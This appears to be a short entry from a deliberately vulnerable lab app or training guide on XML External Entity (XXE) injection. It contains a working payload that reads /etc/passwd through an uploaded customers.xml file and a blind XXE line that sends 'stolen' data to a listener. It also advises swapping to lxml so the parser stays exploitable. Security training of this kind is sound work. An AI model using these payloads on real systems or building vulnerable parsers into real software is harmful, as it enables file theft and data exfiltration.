[V-26] XML External Entity (XXE) Injection
Upload an XML file. The parser processes DOCTYPE/ENTITY declarations.

Payload to read /etc/passwd (save as customers.xml): 
<?xml version="1.0"?>
<!DOCTYPE customers [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<customers>
  <customer>
    <name>&xxe;</name>
    <email>leak@test.com</email>
  </customer>
</customers>
Blind XXE (hit the listener): 
<!ENTITY xxe SYSTEM "http://127.0.0.1:8080/?data=stolen">
Note: Standard library ET blocks this in Python ≥ 3.8. Swap to lxml for full demo.
